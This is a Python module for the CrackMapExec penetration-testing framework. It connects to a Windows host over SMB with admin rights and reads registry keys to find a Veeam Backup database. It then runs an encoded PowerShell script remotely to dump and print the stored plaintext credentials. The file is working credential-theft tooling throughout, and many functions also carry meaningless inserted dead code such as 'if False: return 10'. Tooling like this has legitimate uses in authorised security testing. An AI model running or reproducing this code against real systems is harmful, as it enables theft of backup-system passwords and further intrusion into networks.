from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5 import rrp
from impacket.examples.secretsdump import RemoteOperations
import traceback
from base64 import b64encode
from cme.helpers.powershell import get_ps_script

class CMEModule:
    """
    Module by @NeffIsBack, @Marshall-Hallenbeck
    """
    name = 'veeam'
    description = 'Extracts credentials from local Veeam SQL Database'
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        if False:
            return 10
        with open(get_ps_script('veeam_dump_module/veeam_dump_mssql.ps1'), 'r') as psFile:
            self.psScriptMssql = psFile.read()
        with open(get_ps_script('veeam_dump_module/veeam_dump_postgresql.ps1'), 'r') as psFile:
            self.psScriptPostgresql = psFile.read()

    def options(self, context, module_options):
        if False:
            while True:
                i = 10
        '\n        No options\n        '
        pass

    def checkVeeamInstalled(self, context, connection):
        if False:
            i = 10
            return i + 15
        context.log.display('Looking for Veeam installation...')
        SqlDatabase = ''
        SqlInstance = ''
        SqlServer = ''
        PostgreSqlExec = ''
        PostgresUserForWindowsAuth = ''
        SqlDatabaseName = ''
        try:
            remoteOps = RemoteOperations(connection.conn, False)
            remoteOps.enableRegistry()
            ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
            regHandle = ans['phKey']
            try:
                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations')
                keyHandle = ans['phkResult']
                database_config = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlActiveConfiguration')[1].split('\x00')[:-1][0]
                context.log.success('Veeam v12 installation found!')
                if database_config == 'PostgreSql':
                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\PostgreSQL Global Development Group\\PostgreSQL')
                    keyHandle = ans['phkResult']
                    PostgreSqlExec = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'Location')[1].split('\x00')[:-1][0] + '\\bin\\psql.exe'
                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\PostgreSQL')
                    keyHandle = ans['phkResult']
                    PostgresUserForWindowsAuth = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'PostgresUserForWindowsAuth')[1].split('\x00')[:-1][0]
                    SqlDatabaseName = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlDatabaseName')[1].split('\x00')[:-1][0]
                elif database_config == 'MsSql':
                    ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Veeam\\Veeam Backup and Replication\\DatabaseConfigurations\\MsSql')
                    keyHandle = ans['phkResult']
                    SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlDatabaseName')[1].split('\x00')[:-1][0]
                    SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlInstanceName')[1].split('\x00')[:-1][0]
                    SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlServerName')[1].split('\x00')[:-1][0]
            except DCERPCException as e:
                if str(e).find('ERROR_FILE_NOT_FOUND'):
                    context.log.debug('No Veeam v12 installation found')
            except Exception as e:
                context.log.fail(f'UNEXPECTED ERROR: {e}')
                context.log.debug(traceback.format_exc())
            try:
                ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Veeam\\Veeam Backup and Replication')
                keyHandle = ans['phkResult']
                SqlDatabase = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlDatabaseName')[1].split('\x00')[:-1][0]
                SqlInstance = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlInstanceName')[1].split('\x00')[:-1][0]
                SqlServer = rrp.hBaseRegQueryValue(remoteOps._RemoteOperations__rrp, keyHandle, 'SqlServerName')[1].split('\x00')[:-1][0]
                context.log.success('Veeam v11 installation found!')
            except DCERPCException as e:
                if str(e).find('ERROR_FILE_NOT_FOUND'):
                    context.log.debug('No Veeam v11 installation found')
            except Exception as e:
                context.log.fail(f'UNEXPECTED ERROR: {e}')
                context.log.debug(traceback.format_exc())
        except NotImplementedError as e:
            pass
        except Exception as e:
            context.log.fail(f'UNEXPECTED ERROR: {e}')
            context.log.debug(traceback.format_exc())
        finally:
            try:
                remoteOps.finish()
            except Exception as e:
                context.log.debug(f'Error shutting down remote registry service: {e}')
        if SqlDatabase and SqlInstance and SqlServer:
            context.log.success(f'Found Veeam DB "{SqlDatabase}" on SQL Server "{SqlServer}\\{SqlInstance}"! Extracting stored credentials...')
            credentials = self.executePsMssql(context, connection, SqlDatabase, SqlInstance, SqlServer)
            self.printCreds(context, credentials)
        elif PostgreSqlExec and PostgresUserForWindowsAuth and SqlDatabaseName:
            context.log.success(f'Found Veeam DB "{SqlDatabaseName}" on an PostgreSQL Instance! Extracting stored credentials...')
            credentials = self.executePsPostgreSql(context, connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName)
            self.printCreds(context, credentials)

    def stripXmlOutput(self, context, output):
        if False:
            for i in range(10):
                print('nop')
        return output.split('CLIXML')[1].split('<Objs Version')[0]

    def executePsMssql(self, context, connection, SqlDatabase, SqlInstance, SqlServer):
        if False:
            return 10
        self.psScriptMssql = self.psScriptMssql.replace('REPLACE_ME_SqlDatabase', SqlDatabase)
        self.psScriptMssql = self.psScriptMssql.replace('REPLACE_ME_SqlInstance', SqlInstance)
        self.psScriptMssql = self.psScriptMssql.replace('REPLACE_ME_SqlServer', SqlServer)
        psScipt_b64 = b64encode(self.psScriptMssql.encode('UTF-16LE')).decode('utf-8')
        return connection.execute('powershell.exe -e {} -OutputFormat Text'.format(psScipt_b64), True)

    def executePsPostgreSql(self, context, connection, PostgreSqlExec, PostgresUserForWindowsAuth, SqlDatabaseName):
        if False:
            while True:
                i = 10
        self.psScriptPostgresql = self.psScriptPostgresql.replace('REPLACE_ME_PostgreSqlExec', PostgreSqlExec)
        self.psScriptPostgresql = self.psScriptPostgresql.replace('REPLACE_ME_PostgresUserForWindowsAuth', PostgresUserForWindowsAuth)
        self.psScriptPostgresql = self.psScriptPostgresql.replace('REPLACE_ME_SqlDatabaseName', SqlDatabaseName)
        psScipt_b64 = b64encode(self.psScriptPostgresql.encode('UTF-16LE')).decode('utf-8')
        return connection.execute('powershell.exe -e {} -OutputFormat Text'.format(psScipt_b64), True)

    def printCreds(self, context, output):
        if False:
            return 10
        if 'CLIXML' in output:
            output = self.stripXmlOutput(context, output)
        if 'Access denied' in output:
            context.log.fail('Access denied! This is probably due to an AntiVirus software blocking the execution of the PowerShell script.')
        output_stripped = [' '.join(line.split()) for line in output.split('\r\n') if line.strip()]
        if "Can't connect to DB! Exiting..." in output_stripped or 'No passwords found!' in output_stripped:
            context.log.fail(output_stripped[0])
            return
        for account in output_stripped:
            (user, password) = account.split(' ', 1)
            password = password.replace('WHITESPACE_ERROR', ' ')
            context.log.highlight(user + ':' + f'{password}')
            if ' ' in password:
                context.log.fail(f'Password contains whitespaces! The password for user "{user}" is: "{password}"')

    def on_admin_login(self, context, connection):
        if False:
            for i in range(10):
                print('nop')
        self.checkVeeamInstalled(context, connection)